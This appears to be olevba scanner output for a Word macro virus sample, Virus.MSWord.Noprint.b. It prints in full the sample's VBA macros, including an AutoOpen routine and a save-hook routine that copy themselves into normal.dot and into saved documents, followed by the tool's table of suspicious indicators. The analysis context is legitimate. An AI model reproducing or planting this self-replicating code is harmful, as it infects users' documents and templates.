olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Noprint.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Noprint.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DateiDruckenStandard.bas 
in file: ./Virus.MSWord.Noprint.b - OLE stream: 'Macros/VBA/DateiDruckenStandard'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Druckt das aktive Dokument mit den aktuellen Standardeinstellungen."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiDruckenStandard.MAIN"
 WordBasic.FilePrint
End Sub
-------------------------------------------------------------------------------
VBA MACRO DateiSpeichern.bas 
in file: ./Virus.MSWord.Noprint.b - OLE stream: 'Macros/VBA/DateiSpeichern'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Speichert die aktuelle Datei oder Dokumentvorlage."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiSpeichern.MAIN"
Dim Z$
Dim Q$
 WordBasic.FileSaveAs Format:=1
 If WordBasic.CountMacros(1) = 0 Then
 Z$ = WordBasic.[FileName$]():
 Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="AutoOpen", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiDrucken", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiDruckenStandard", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiSpeichern", Tab:=3:
 WordBasic.FileSaveAll 1, 1
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO DateiDrucken.bas 
in file: ./Virus.MSWord.Noprint.b - OLE stream: 'Macros/VBA/DateiDrucken'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Druckt das aktive Dokument."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DateiDrucken.MAIN"
 WordBasic.FilePrint
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Noprint.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Q$
Dim Z$
 If WordBasic.CountMacros(1) <> 0 Then
 Q$ = WordBasic.[FileName$]():
 Z$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="AutoOpen", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiDrucken", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiDruckenStandard", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiSpeichern", Tab:=3
 Else
 WordBasic.FileSaveAs Format:=1:
 If WordBasic.CountMacros(1) = 0 Then
 Z$ = WordBasic.[FileName$]():
 Q$ = WordBasic.[DefaultDir$](2) + "\normal.dot":
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="AutoOpen", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiDrucken", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiDruckenStandard", Tab:=3:
 WordBasic.Organizer Copy:=1, Source:=Q$, Destination:=Z$, _
              Name:="DateiSpeichern", Tab:=3
 End If
 End If
 WordBasic.FileSaveAll 1, 1
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

